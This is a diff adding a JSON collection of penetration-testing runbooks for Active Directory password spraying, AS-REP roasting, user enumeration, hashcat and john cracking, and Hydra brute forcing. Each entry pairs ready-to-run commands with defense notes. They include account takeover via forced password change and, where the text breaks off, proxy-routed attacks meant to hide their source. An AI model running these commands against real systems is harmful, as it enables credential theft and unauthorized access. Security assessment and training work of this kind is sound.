@@ -1,0 +1,548 @@
+[
+  {
+    "id": "630e7bf5-7476-5f84-b7ce-f3e77f4965a8",
+    "label": "AD Domain Password Spray Workflow",
+    "command": "crackmapexec <IP> -u 'user' -p 'password' --pass-pol\ncrackmapexec smb <IP> -u users.txt -p passwords.txt\nnetexec smb <DC_FQDN> -u users.txt -p 'Password123!' --continue-on-success --no-bruteforce --shares\n./kerbrute_linux_amd64 passwordspray -d lab.ropnop.com domain_users.txt Password123\n./kerbrute_linux_amd64 bruteuser -d lab.ropnop.com passwords.lst thoffman\nnetexec smb <dc_fqdn> -u '' -p '' --rid-brute | awk -F'\\\\\\\\| ' '/SidTypeUser/ {print $3}' > users.txt\nnetexec smb <DC.FQDN> -u users.txt -p '' --continue-on-success\nenv NEWPASS='P@ssw0rd!2025#' ; netexec smb <DC.FQDN> -u <User> -p '' -M change-password -o NEWPASS=\"$NEWPASS\"\nnetexec smb <DC.FQDN> -u <User> -p \"$NEWPASS\" --pass-pol",
+    "description": "<p>This runbook executes lockout-aware Active Directory password spraying and user validation using <span style=\"color:#ef4444;font-weight:bold;\">#crackmapexec</span>, <span style=\"color:#ef4444;font-weight:bold;\">#netexec</span>, and <span style=\"color:#ef4444;font-weight:bold;\">#kerbrute</span>. It prioritizes policy reconnaissance, low-noise username discovery, and controlled auth checks.</p>\n<p>It also includes a takeover path for accounts in `STATUS_PASSWORD_MUST_CHANGE` state, where an operator with appropriate rights may set a known password and validate access.</p>\n\n<ol>\n  <li><strong>Enumerate policy/users:</strong> discover lockout policy and candidate user list safely.</li>\n  <li><strong>Run controlled spray:</strong> test one/few passwords across many users with anti-lockout pacing.</li>\n  <li><strong>Validate edge-account states:</strong> handle must-change-password scenarios and confirm resulting access.</li>\n</ol>\n\n<ul>\n  <li><strong>Tool Location/Source:</strong> <span style=\"color:#ef4444;font-weight:bold;\">#crackmapexec</span>/<span style=\"color:#ef4444;font-weight:bold;\">#netexec</span> (Kali offensive toolset), <span style=\"color:#ef4444;font-weight:bold;\">#kerbrute</span> binary for Kerberos user validation/spraying.</li>\n  <li><strong>Attack pre-requisite:</strong> network reachability to AD services on <span style=\"color:#3b82f6;font-weight:bold;\">TCP 445/88</span>, domain context, and an authorized assessment scope.</li>\n  <li><strong>What attacker gain:</strong> valid domain credentials, account state intelligence, and potential foothold for lateral movement.</li>\n  <li><strong>Detection/Defense opsec:</strong> monitor failed-auth bursts, enforce smart lockout, deploy MFA/Conditional Access, and alert on abnormal SMB/Kerberos authentication patterns.</li>\n</ul>\n\n<p><strong>Core Commands:</strong></p>\n<pre><code>crackmapexec &lt;IP&gt; -u 'user' -p 'password' --pass-pol\ncrackmapexec smb &lt;IP&gt; -u users.txt -p passwords.txt\nnetexec smb &lt;DC_FQDN&gt; -u users.txt -p 'Password123!' --continue-on-success --no-bruteforce --shares\n./kerbrute_linux_amd64 passwordspray -d lab.ropnop.com domain_users.txt Password123\n./kerbrute_linux_amd64 bruteuser -d lab.ropnop.com passwords.lst thoffman\nnetexec smb &lt;dc_fqdn&gt; -u '' -p '' --rid-brute | awk -F'\\\\\\\\| ' '/SidTypeUser/ {print $3}' &gt; users.txt\nnetexec smb &lt;DC.FQDN&gt; -u users.txt -p '' --continue-on-success\nenv NEWPASS='P@ssw0rd!2025#' ; netexec smb &lt;DC.FQDN&gt; -u &lt;User&gt; -p '' -M change-password -o NEWPASS=\"$NEWPASS\"\nnetexec smb &lt;DC.FQDN&gt; -u &lt;User&gt; -p \"$NEWPASS\" --pass-pol</code></pre>",
+    "tags": [
+      "password-cracking",
+      "active-directory",
+      "password-spraying",
+      "netexec",
+      "phase:credential-access"
+    ],
+    "color": "#eab308"
+  },
+  {
+    "id": "a84349d8-e5e1-554b-a043-5369cdc79f0a",
+    "label": "AS REP Roasting to Offline Crack",
+    "command": "python GetNPUsers.py <DOMAIN>/ -usersfile usernames.txt -format hashcat -outputfile hashes.asreproast\npython GetNPUsers.py <DOMAIN>/<USER>:<PASS> -request -format hashcat -outputfile hashes.asreproast\nASRepCatcher relay -dc $DC_IP\nASRepCatcher relay -dc $DC_IP --disable-spoofing\nASRepCatcher listen\njohn --wordlist=passwords_kerb.txt hashes.asreproast\nhashcat -m 18200 -a 0 hashes.asreproast passwords_kerb.txt",
+    "description": "<p>This runbook targets Kerberos accounts configured without pre-authentication by extracting AS-REP responses and cracking them offline. It supports direct extraction with <span style=\"color:#ef4444;font-weight:bold;\">#GetNPUsers.py</span> and traffic-capture approaches via <span style=\"color:#ef4444;font-weight:bold;\">#ASRepCatcher</span>.</p>\n<p>Recovered AS-REP material is then cracked with <span style=\"color:#ef4444;font-weight:bold;\">#john</span> or <span style=\"color:#ef4444;font-weight:bold;\">#hashcat -m 18200</span>, enabling credential recovery without online brute-force noise.</p>\n\n<ol>\n  <li><strong>Collect roastable responses:</strong> request AS-REP for users with preauth disabled or capture via relay/listen workflows.</li>\n  <li><strong>Normalize output format:</strong> export in hashcat-compatible form for reliable cracking tooling.</li>\n  <li><strong>Run offline cracking:</strong> execute wordlist/rule attacks against AS-REP ciphertext material.</li>\n</ol>\n\n<ul>\n  <li><strong>Tool Location/Source:</strong> <span style=\"color:#ef4444;font-weight:bold;\">#GetNPUsers.py</span> (Impacket), <span style=\"color:#ef4444;font-weight:bold;\">#ASRepCatcher</span>, <span style=\"color:#ef4444;font-weight:bold;\">#hashcat</span>, <span style=\"color:#ef4444;font-weight:bold;\">#john</span>.</li>\n  <li><strong>Attack pre-requisite:</strong> target accounts with `DONT_REQ_PREAUTH` behavior or capture position to observe AS-REQ/AS-REP exchanges on <span style=\"color:#3b82f6;font-weight:bold;\">TCP/UDP 88</span>.</li>\n  <li><strong>What attacker gain:</strong> recoverable Kerberos credential material leading to domain account compromise.</li>\n  <li><strong>Detection/Defense opsec:</strong> disable preauth-disabled account configurations, monitor abnormal AS-REQ patterns, enforce strong password policy and MFA where applicable.</li>\n</ul>\n\n<p><strong>Core Commands:</strong></p>\n<pre><code>python GetNPUsers.py &lt;DOMAIN&gt;/ -usersfile usernames.txt -format hashcat -outputfile hashes.asreproast\npython GetNPUsers.py &lt;DOMAIN&gt;/&lt;USER&gt;:&lt;PASS&gt; -request -format hashcat -outputfile hashes.asreproast\nASRepCatcher relay -dc $DC_IP\nASRepCatcher relay -dc $DC_IP --disable-spoofing\nASRepCatcher listen\njohn --wordlist=passwords_kerb.txt hashes.asreproast\nhashcat -m 18200 -a 0 hashes.asreproast passwords_kerb.txt</code></pre>",
+    "tags": [
+      "password-cracking",
+      "active-directory",
+      "as-rep-roast",
+      "kerberos",
+      "phase:credential-access"
+    ],
+    "color": "#eab308"
+  },
+  {
+    "id": "e3a72496-f121-5034-a273-c076ea6a2fc8",
+    "label": "Combinator and Inline Rule Chaining",
+    "command": "hashcat -a 1 -m 1000 hashes.ntlm wordlist1.txt wordlist2.txt\nhashcat -a 1 -m 1000 hashes.ntlm wordlist1.txt wordlist2.txt -j '$-' -k '$!'\nhashcat --stdout -r 123.rule -r abc.rule wordlist.txt",
+    "description": "<p>This runbook expands candidate quality by combining two wordlists and mutating left/right sides independently. It targets real-world password construction where users concatenate meaningful tokens (e.g., season + project, company + year).</p>\n<p>Using <span style=\"color:#ef4444;font-weight:bold;\">#hashcat -a 1</span> with <span style=\"color:#ef4444;font-weight:bold;\">#-j</span>/<span style=\"color:#ef4444;font-weight:bold;\">#-k</span> rule chaining produces richer candidates than single-dictionary runs while remaining cheaper than full brute-force.</p>\n\n<ol>\n  <li><strong>Prepare segmented wordlists:</strong> split likely roots into two corpora (org terms, leaked words, pattern components).</li>\n  <li><strong>Generate pairwise combinations:</strong> combinator mode creates candidate joins across left and right lists.</li>\n  <li><strong>Apply side-specific mutations:</strong> prepend/append transforms on each side emulate common composition behaviors.</li>\n</ol>\n\n<ul>\n  <li><strong>Tool Location/Source:</strong> <span style=\"color:#ef4444;font-weight:bold;\">#hashcat</span> plus local rules in `docs/sources-runbooks/password-cracking/hashcat/`.</li>\n  <li><strong>Attack pre-requisite:</strong> two meaningful wordlists derived from target context and validated hash mode from triage stage.</li>\n  <li><strong>What attacker gain:</strong> improved recovery of structured passwords missed by simple dictionary runs.</li>\n  <li><strong>Detection/Defense opsec:</strong> enforce passphrase complexity and deny predictable concatenation patterns; rotate exposed passwords quickly after incidents.</li>\n</ul>\n\n<p><strong>Core Commands:</strong></p>\n<pre><code>hashcat -a 1 -m 1000 hashes.ntlm wordlist1.txt wordlist2.txt\nhashcat -a 1 -m 1000 hashes.ntlm wordlist1.txt wordlist2.txt -j '$-' -k '$!'\nhashcat --stdout -r 123.rule -r abc.rule wordlist.txt</code></pre>",
+    "tags": [
+      "password-cracking",
+      "hashcat",
+      "combinator",
+      "rule-chaining",
+      "phase:offline-crack"
+    ],
+    "color": "#eab308"
+  },
+  {
+    "id": "f6b5b9d5-93f6-56e7-9d03-058f204bd7b2",
+    "label": "GetADUsers Metadata Enumeration Workflow",
+    "command": "GetADUsers.py corp.local/jdoe:'Passw0rd!' -dc-ip 10.0.0.10\nGetADUsers.py corp.local/jdoe:'Passw0rd!' -user alice -dc-host dc01.corp.local\nGetADUsers.py corp.local/ -all -k -no-pass -dc-ip 10.0.0.10",
+    "description": "<p>This runbook uses Impacket <span style=\"color:#ef4444;font-weight:bold;\">#GetADUsers.py</span> to enumerate AD user metadata (for example `pwdLastSet`, `lastLogon`, `mail`) before spraying. It improves target prioritization and campaign ordering.</p>\n<p>By identifying stale/inactive patterns and account attributes, operators can select lower-risk/high-probability username cohorts for controlled credential testing.</p>\n\n<ol>\n  <li><strong>Query broad user metadata:</strong> collect baseline user details from domain controller.</li>\n  <li><strong>Scope to specific users when needed:</strong> pull focused records for targeted assessments.</li>\n  <li><strong>Prioritize spray plan:</strong> rank candidate users and schedule low-noise authentication checks.</li>\n</ol>\n\n<ul>\n  <li><strong>Tool Location/Source:</strong> Impacket example <span style=\"color:#ef4444;font-weight:bold;\">#GetADUsers.py</span>.</li>\n  <li><strong>Attack pre-requisite:</strong> domain reachability on LDAP/Kerberos paths (for example <span style=\"color:#3b82f6;font-weight:bold;\">TCP 389/88</span>) and valid auth context or Kerberos ticket options.</li>\n  <li><strong>What attacker gain:</strong> improved user-target intelligence and higher-efficiency spray sequencing.</li>\n  <li><strong>Detection/Defense opsec:</strong> monitor abnormal LDAP query behavior, least-privilege directory access, and correlate metadata harvesting with subsequent auth attempts.</li>\n</ul>\n\n<p><strong>Core Commands:</strong></p>\n<pre><code>GetADUsers.py corp.local/jdoe:'Passw0rd!' -dc-ip 10.0.0.10\nGetADUsers.py corp.local/jdoe:'Passw0rd!' -user alice -dc-host dc01.corp.local\nGetADUsers.py corp.local/ -all -k -no-pass -dc-ip 10.0.0.10</code></pre>",
+    "tags": [
+      "password-cracking",
+      "active-directory",
+      "impacket",
+      "user-enumeration",
+      "phase:recon"
+    ],
+    "color": "#eab308"
+  },
+  {
+    "id": "299b5fe0-774a-5f47-bbb7-f167770e6b5c",
+    "label": "Haiti Wrapper Guided Mode Selection",
+    "command": "hashcat-haiti -e d41d8cd98f00b204e9800998ecf8427e -- hashes.txt /usr/share/wordlists/passwords/rockyou.txt -r /usr/share/doc/hashcat/rules/best64.rule\njohn-haiti -e d41d8cd98f00b204e9800998ecf8427e -- hashes.txt --wordlist=/usr/share/wordlists/passwords/rockyou.txt\nhaiti-fzf hc -e d41d8cd98f00b204e9800998ecf8427e\nhaiti-parsable jtr d41d8cd98f00b204e9800998ecf8427e",
+    "description": "<p>This runbook accelerates hash-type-to-tool mapping using Haiti wrappers that bridge identification with launch-ready Hashcat or John command scaffolding. It reduces operator mistakes when facing ambiguous hash material.</p>\n<p>Wrappers such as <span style=\"color:#ef4444;font-weight:bold;\">#hashcat-haiti</span>, <span style=\"color:#ef4444;font-weight:bold;\">#john-haiti</span>, <span style=\"color:#ef4444;font-weight:bold;\">#haiti-fzf</span>, and <span style=\"color:#ef4444;font-weight:bold;\">#haiti-parsable</span> support faster workflow startup and automation-friendly selection paths.</p>\n\n<ol>\n  <li><strong>Identify and select mode:</strong> run Haiti wrappers on sample hash material to map valid mode/format options.</li>\n  <li><strong>Launch cracking workflow:</strong> pass cracking arguments directly through wrapper chain.</li>\n  <li><strong>Integrate with automation:</strong> use parsable output or fzf-driven selection for scripted pipelines.</li>\n</ol>\n\n<ul>\n  <li><strong>Tool Location/Source:</strong> <span style=\"color:#ef4444;font-weight:bold;\">#haiti</span> suite binaries (`haiti`, `hashcat-haiti`, `john-haiti`, `haiti-fzf`, `haiti-parsable`).</li>\n  <li><strong>Attack pre-requisite:</strong> sample hash line and installed backend cracking tool (<span style=\"color:#ef4444;font-weight:bold;\">#hashcat</span> or <span style=\"color:#ef4444;font-weight:bold;\">#john</span>).</li>\n  <li><strong>What attacker gain:</strong> faster and more accurate launch into correct cracking mode/format, lowering setup errors.</li>\n  <li><strong>Detection/Defense opsec:</strong> triage speed means defenders have less response time once hashes leak; immediate credential revocation is critical.</li>\n</ul>\n\n<p><strong>Core Commands:</strong></p>\n<pre><code>hashcat-haiti -e d41d8cd98f00b204e9800998ecf8427e -- hashes.txt /usr/share/wordlists/passwords/rockyou.txt -r /usr/share/doc/hashcat/rules/best64.rule\njohn-haiti -e d41d8cd98f00b204e9800998ecf8427e -- hashes.txt --wordlist=/usr/share/wordlists/passwords/rockyou.txt\nhaiti-fzf hc -e d41d8cd98f00b204e9800998ecf8427e\nhaiti-parsable jtr d41d8cd98f00b204e9800998ecf8427e</code></pre>",
+    "tags": [
+      "password-cracking",
+      "haiti",
+      "hash-identification",
+      "workflow-automation",
+      "phase:triage"
+    ],
+    "color": "#eab308"
+  },
+  {
+    "id": "d7419d60-6d53-5092-8b98-e242b0e23c11",
+    "label": "Hash Type Triage and Mode Mapping",
+    "command": "haiti -e '<hash>'\nhashcat --identify my.hash\nhashcat --example-hashes | grep -B1 -A2 \"NTLM\"",
+    "description": "<p><strong>Hash triage</strong> is the first decision gate in any credential attack workflow: before burning CPU/GPU time, the operator must accurately map raw hash material to the correct cracking engine format and mode ID.</p>\n<p>This runbook uses <span style=\"color:#ef4444;font-weight:bold;\">#haiti</span>, <span style=\"color:#ef4444;font-weight:bold;\">#hashcat</span>, and format examples to resolve ambiguity (e.g., 32-hex collisions between MD5-like families, NetNTLMv2 vs NTLM, Kerberos variants). Correct mapping prevents false negatives caused by running valid candidates against the wrong parser.</p>\n\n<ol>\n  <li><strong>Ingest hash material:</strong> collect one or more sample lines from dump artifacts (SAM/NTDS, responder captures, ticket extractions, app databases).</li>\n  <li><strong>Classify candidates:</strong> run <span style=\"color:#ef4444;font-weight:bold;\">#haiti</span> and <span style=\"color:#ef4444;font-weight:bold;\">#hashcat --identify</span> to enumerate plausible types.</li>\n  <li><strong>Resolve to execution mode:</strong> validate against <span style=\"color:#ef4444;font-weight:bold;\">#hashcat --example-hashes</span> and lock the final mode/format for downstream cracking runbooks.</li>\n</ol>\n\n<ul>\n  <li><strong>Tool Location/Source:</strong> <span style=\"color:#ef4444;font-weight:bold;\">#haiti</span> (hash identification utility; commonly installed on Kali or via upstream package managers), <span style=\"color:#ef4444;font-weight:bold;\">#hashcat</span> (`/usr/bin/hashcat` on typical Kali installs), and local hashcat documentation/examples in this profile source set.</li>\n  <li><strong>Attack pre-requisite:</strong> access to captured hash material and enough context to distinguish transport/auth protocol (e.g., SMB challenge-response vs local account database hash).</li>\n  <li><strong>What attacker gain:</strong> a validated cracking strategy (correct mode, parser, and candidate-generation path), dramatically reducing wasted cycles and bad assumptions.</li>\n  <li><strong>Detection/Defense opsec:</strong> monitor and alert on hash dumping precursors (LSASS access, SAM/NTDS extraction, Responder/relay artifacts); harden credential surfaces with MFA, strong password policy, and protocol hardening (SMB signing, disable legacy auth where feasible).</li>\n</ul>\n\n<p><strong>Core Commands:</strong></p>\n<pre><code>haiti -e '&lt;hash&gt;'\nhashcat --identify my.hash\nhashcat --example-hashes | grep -B1 -A2 \"NTLM\"</code></pre>",
+    "tags": [
+      "password-cracking",
+      "hash-identification",
+      "tool:hashcat",
+      "tool:haiti",
+      "phase:recon"
+    ],
+    "color": "#eab308"
+  },
+  {
+    "id": "1feb02da-835b-5eef-90ab-2cf2a57fb40b",
+    "label": "Hashcat Association Mode 9 Expansion",
+    "command": "hashcat -a 9 -m 500 example500.hash 1word.dict -r rules/best66.rule\nhashcat -a 9 -m 500 example500.hash 1word.dict --speed-only",
+    "description": "<p>This runbook uses hashcat attack-mode 9 to execute association-style candidate generation with optional rule amplification. It is positioned as an advanced alternative when classic straight/combinator modes underperform for linked candidate patterns.</p>\n<p>Mode 9 can be benchmarked quickly and integrated into phased cracking plans after baseline dictionary/rules attacks.</p>\n\n<ol>\n  <li><strong>Launch association mode:</strong> run mode 9 with an appropriate base word source.</li>\n  <li><strong>Amplify with rules:</strong> apply selected rulesets to widen associated candidate variants.</li>\n  <li><strong>Measure viability:</strong> validate speed and crack yield before large-scale runtime commitment.</li>\n</ol>\n\n<ul>\n  <li><strong>Tool Location/Source:</strong> <span style=\"color:#ef4444;font-weight:bold;\">#hashcat</span> attack-mode 9 support in standard help/examples.</li>\n  <li><strong>Attack pre-requisite:</strong> correctly identified hash mode and suitable source dictionary for association expansion.</li>\n  <li><strong>What attacker gain:</strong> extra coverage on candidate families not well-served by baseline attack modes.</li>\n  <li><strong>Detection/Defense opsec:</strong> association strategies exploit predictable credential semantics; strong randomized passphrases remain primary control.</li>\n</ul>\n\n<p><strong>Core Commands:</strong></p>\n<pre><code>hashcat -a 9 -m 500 example500.hash 1word.dict -r rules/best66.rule\nhashcat -a 9 -m 500 example500.hash 1word.dict --speed-only</code></pre>",
+    "tags": [
+      "password-cracking",
+      "hashcat",
+      "attack-mode-9",
+      "candidate-expansion",
+      "phase:advanced-generation"
+    ],
+    "color": "#eab308"
+  },
+  {
+    "id": "c9997398-5e58-5387-84e1-0a3c839b4e3d",
+    "label": "Hashcat Mode 8 Feed Integration",
+    "command": "hashcat -m 0 example0.hash -a 8 feeds/feed_wordlist.so example.dict\nhashcat -a 8 -m 500 example500.hash feeds/feed_wordlist.so 1word.dict -r rules/best66.rule\nhashcat -a 8 -m 0 example0.hash feeds/feed_wordlist.so example.dict --keyspace",
+    "description": "<p>This runbook uses hashcat attack-mode 8 to inject custom password candidate generators (feeds) while retaining core hashcat scheduling and reporting controls. It is useful when advanced candidate logic outgrows standard attack modes.</p>\n<p>With <span style=\"color:#ef4444;font-weight:bold;\">#-a 8</span>, the first positional argument is a feed plugin (for example <span style=\"color:#ef4444;font-weight:bold;\">#feeds/feed_wordlist.so</span>), and subsequent loose parameters are passed to that feed.</p>\n\n<ol>\n  <li><strong>Select feed plugin:</strong> choose generator implementation aligned to candidate strategy.</li>\n  <li><strong>Pass feed parameters:</strong> provide wordlists or generator-specific args after plugin path.</li>\n  <li><strong>Leverage native controls:</strong> use keyspace/progress/speed/rules with feed-driven generation.</li>\n</ol>\n\n<ul>\n  <li><strong>Tool Location/Source:</strong> <span style=\"color:#ef4444;font-weight:bold;\">#hashcat</span> with attack-mode 8 feed support and feed binaries in the local hashcat distribution.</li>\n  <li><strong>Attack pre-requisite:</strong> compatible feed plugin, correct target hash mode, and validated feed argument syntax.</li>\n  <li><strong>What attacker gain:</strong> higher-flexibility candidate generation and improved integration with distributed cracking workflows.</li>\n  <li><strong>Detection/Defense opsec:</strong> feed customization increases attacker adaptability; defensive focus remains rapid credential invalidation and hardening against initial hash theft.</li>\n</ul>\n\n<p><strong>Core Commands:</strong></p>\n<pre><code>hashcat -m 0 example0.hash -a 8 feeds/feed_wordlist.so example.dict\nhashcat -a 8 -m 500 example500.hash feeds/feed_wordlist.so 1word.dict -r rules/best66.rule\nhashcat -a 8 -m 0 example0.hash feeds/feed_wordlist.so example.dict --keyspace</code></pre>",
+    "tags": [
+      "password-cracking",
+      "hashcat",
+      "attack-mode-8",
+      "feed-plugin",
+      "phase:advanced-generation"
+    ],
+    "color": "#eab308"
+  },
+  {
+    "id": "5842e79a-0c3b-5403-86d6-d80300708633",
+    "label": "Hashcat Benchmark and Backend Profiling",
+    "command": "hashcat -b -m 1000\nhashcat -b --benchmark-all\nhashcat -I\nhashcat -m 1000 hashes.ntlm wordlist.txt --speed-only\nhashcat -m 1000 hashes.ntlm wordlist.txt --progress-only",
+    "description": "<p>This runbook establishes cracking performance baselines and backend capability visibility before launching expensive jobs. It reduces planning errors by measuring expected throughput and device readiness up front.</p>\n<p>It uses <span style=\"color:#ef4444;font-weight:bold;\">#hashcat -b</span>, backend inspection via <span style=\"color:#ef4444;font-weight:bold;\">#-I</span>, and quick speed/progress estimators to size runtime windows and attack sequencing.</p>\n\n<ol>\n  <li><strong>Benchmark representative modes:</strong> measure realistic speed for target hash families.</li>\n  <li><strong>Inspect backend health:</strong> verify available devices, runtime, and acceleration context.</li>\n  <li><strong>Estimate campaign runtime:</strong> use speed/progress-only checks to allocate cracking phases safely.</li>\n</ol>\n\n<ul>\n  <li><strong>Tool Location/Source:</strong> <span style=\"color:#ef4444;font-weight:bold;\">#hashcat</span> benchmark and backend options in standard release builds.</li>\n  <li><strong>Attack pre-requisite:</strong> selected hash mode set and available GPU/CPU devices for benchmarking.</li>\n  <li><strong>What attacker gain:</strong> higher campaign efficiency, better keyspace planning, fewer stalled or unrealistic cracking runs.</li>\n  <li><strong>Detection/Defense opsec:</strong> accelerate credential reset timelines; once hash artifacts are exposed, attacker throughput can be rapidly optimized.</li>\n</ul>\n\n<p><strong>Core Commands:</strong></p>\n<pre><code>hashcat -b -m 1000\nhashcat -b --benchmark-all\nhashcat -I\nhashcat -m 1000 hashes.ntlm wordlist.txt --speed-only\nhashcat -m 1000 hashes.ntlm wordlist.txt --progress-only</code></pre>",
+    "tags": [
+      "password-cracking",
+      "hashcat",
+      "benchmarking",
+      "backend-info",
+      "phase:operations"
+    ],
+    "color": "#eab308"
+  },
+  {
+    "id": "1bd4fe4a-deb7-5a57-8b4f-6d34ccfaa229",
+    "label": "Hashcat Keyspace Partition and Slicing",
+    "command": "hashcat -a 3 -m 1000 hashes.ntlm ?u?l?l?l?l?l?l?d --keyspace\nhashcat -a 3 -m 1000 hashes.ntlm ?u?l?l?l?l?l?l?d --total-candidates\nhashcat -a 3 -m 1000 hashes.ntlm ?u?l?l?l?l?l?l?d -s 0 -l 50000000\nhashcat -a 3 -m 1000 hashes.ntlm ?u?l?l?l?l?l?l?d -s 50000000 -l 50000000",
+    "description": "<p>This runbook splits large candidate spaces into deterministic chunks for distributed workers, phased campaigns, or resumable batch execution. It prevents overlap and enables controlled parallelism.</p>\n<p>Using <span style=\"color:#ef4444;font-weight:bold;\">#--keyspace</span>, <span style=\"color:#ef4444;font-weight:bold;\">#--total-candidates</span>, <span style=\"color:#ef4444;font-weight:bold;\">#--skip</span>, and <span style=\"color:#ef4444;font-weight:bold;\">#--limit</span>, operators can assign exact ranges to separate cracking nodes.</p>\n\n<ol>\n  <li><strong>Measure candidate universe:</strong> calculate keyspace and total candidate count for the chosen attack.</li>\n  <li><strong>Define non-overlapping slices:</strong> assign skip/limit offsets per worker.</li>\n  <li><strong>Aggregate outcomes:</strong> merge cracked outputs and track unresolved ranges for reprocessing.</li>\n</ol>\n\n<ul>\n  <li><strong>Tool Location/Source:</strong> <span style=\"color:#ef4444;font-weight:bold;\">#hashcat</span> keyspace and slicing flags in standard builds.</li>\n  <li><strong>Attack pre-requisite:</strong> deterministic attack definition (mask/wordlist/rule settings) shared by all workers.</li>\n  <li><strong>What attacker gain:</strong> faster wall-clock completion and cleaner orchestration for very large cracking jobs.</li>\n  <li><strong>Detection/Defense opsec:</strong> distributed cracking compresses time-to-crack; defenders should prioritize immediate credential invalidation and MFA enforcement after compromise.</li>\n</ul>\n\n<p><strong>Core Commands:</strong></p>\n<pre><code>hashcat -a 3 -m 1000 hashes.ntlm ?u?l?l?l?l?l?l?d --keyspace\nhashcat -a 3 -m 1000 hashes.ntlm ?u?l?l?l?l?l?l?d --total-candidates\nhashcat -a 3 -m 1000 hashes.ntlm ?u?l?l?l?l?l?l?d -s 0 -l 50000000\nhashcat -a 3 -m 1000 hashes.ntlm ?u?l?l?l?l?l?l?d -s 50000000 -l 50000000</code></pre>",
+    "tags": [
+      "password-cracking",
+      "hashcat",
+      "keyspace",
+      "distributed-cracking",
+      "phase:operations"
+    ],
+    "color": "#eab308"
+  },
+  {
+    "id": "605b185a-c19b-57c4-b501-a6686e13bd7e",
+    "label": "Hashcat Session and Recovery Workflow",
+    "command": "hashcat --session=corp_ntlm_q1 -a 0 -m 1000 hashes.ntlm wordlist.txt -r rules/best66.rule\nhashcat --session=corp_ntlm_q1 --restore\nhashcat --status --status-timer=1 --session=corp_ntlm_q1\nhashcat -m 1000 hashes.ntlm --show\nhashcat -m 1000 hashes.ntlm --left",
+    "description": "<p>This runbook operationalizes long cracking jobs with recoverability, live telemetry, and deterministic post-run triage. It is mandatory for stable enterprise-scale cracking where interruptions and phased campaigns are expected.</p>\n<p>It uses named sessions (<span style=\"color:#ef4444;font-weight:bold;\">#--session</span>), resume controls (<span style=\"color:#ef4444;font-weight:bold;\">#--restore</span>), status monitoring, and result splitting via <span style=\"color:#ef4444;font-weight:bold;\">#--show</span>/<span style=\"color:#ef4444;font-weight:bold;\">#--left</span>.</p>\n\n<ol>\n  <li><strong>Launch named campaign:</strong> run cracking jobs with a unique session identifier and stable input artifacts.</li>\n  <li><strong>Monitor and recover:</strong> poll status and resume exactly from checkpoint if interrupted.</li>\n  <li><strong>Split outcomes:</strong> export cracked vs uncracked lists for reporting and follow-on attacks.</li>\n</ol>\n\n<ul>\n  <li><strong>Tool Location/Source:</strong> <span style=\"color:#ef4444;font-weight:bold;\">#hashcat</span> session manager (`--session`, `--restore`, `--status`) in standard builds.</li>\n  <li><strong>Attack pre-requisite:</strong> valid cracking task prepared (hash mode, attack mode, candidate sources).</li>\n  <li><strong>What attacker gain:</strong> reliable campaign continuity and cleaner phase-based decision making for unresolved hash material.</li>\n  <li><strong>Detection/Defense opsec:</strong> incident response should assume resumed cracking capability after workstation interruptions; immediate credential rotation remains critical once leak is confirmed.</li>\n</ul>\n\n<p><strong>Core Commands:</strong></p>\n<pre><code>hashcat --session=corp_ntlm_q1 -a 0 -m 1000 hashes.ntlm wordlist.txt -r rules/best66.rule\nhashcat --session=corp_ntlm_q1 --restore\nhashcat --status --status-timer=1 --session=corp_ntlm_q1\nhashcat -m 1000 hashes.ntlm --show\nhashcat -m 1000 hashes.ntlm --left</code></pre>",
+    "tags": [
+      "password-cracking",
+      "hashcat",
+      "session-management",
+      "recovery",
+      "phase:operations"
+    ],
+    "color": "#eab308"
+  },
+  {
+    "id": "60cd3a30-a177-57fa-a2bc-21c7894aef7b",
+    "label": "Hydra JSON Output and Restore Ops",
+    "command": "hydra -L users.txt -P passlist.txt ssh://target -o results.txt -b text\nhydra -L users.txt -P passlist.txt http-post-form://target -o results.json -b jsonv1\nhydra -R",
+    "description": "<p>This runbook standardizes Hydra result handling with file output formats (`text`, `jsonv1`) and session recovery using restore files. It is essential for long-running campaigns and automation pipelines.</p>\n<p>Operators can export machine-readable evidence for downstream parsing while preserving resumability through <span style=\"color:#ef4444;font-weight:bold;\">#hydra -R</span>.</p>\n\n<ol>\n  <li><strong>Run with explicit output format:</strong> save findings to structured file for reliable ingestion.</li>\n  <li><strong>Capture campaign state:</strong> leverage built-in restore file behavior for interruption resilience.</li>\n  <li><strong>Resume from checkpoint:</strong> continue aborted scans without restarting full attempt set.</li>\n</ol>\n\n<ul>\n  <li><strong>Tool Location/Source:</strong> <span style=\"color:#ef4444;font-weight:bold;\">#hydra</span> output options (`-o`, `-b`) and restore option (`-R`).</li>\n  <li><strong>Attack pre-requisite:</strong> configured credential campaign and writable output location.</li>\n  <li><strong>What attacker gain:</strong> durable evidence artifacts and reduced operational loss during interruptions.</li>\n  <li><strong>Detection/Defense opsec:</strong> rapid lockout/MFA response still needed; resumable attacker workflows reduce defender benefit from transient service interruptions.</li>\n</ul>\n\n<p><strong>Core Commands:</strong></p>\n<pre><code>hydra -L users.txt -P passlist.txt ssh://target -o results.txt -b text\nhydra -L users.txt -P passlist.txt http-post-form://target -o results.json -b jsonv1\nhydra -R</code></pre>",
+    "tags": [
+      "password-cracking",
+      "hydra",
+      "json-output",
+      "session-restore",
+      "phase:operations"
+    ],
+    "color": "#eab308"
+  },
+  {
+    "id": "22279552-6b9f-55d3-aa6f-d4edec6034a4",
+    "label": "Hydra Proxy Routed Attack Workflow",
+    "command": "HYDRA_PROXY_HTTP=\"http://123.45.67.89:8080/\" hydra -L users.txt -P pass.txt http-get://target\nHYDRA_PROXY_HTTP=\"proxylist.txt\" hydra -L users.txt -P pass.txt http-post-form://target\nHYDRA_PROXY=connect://proxy.anonymizer.com:8000 hydra -L users.txt -P pass.txt ssh://target\nHYDRA_PROXY=socks4://auth:pw@127.0.0.1:1080 hydra -L users.txt -P pass.txt rdp://target",
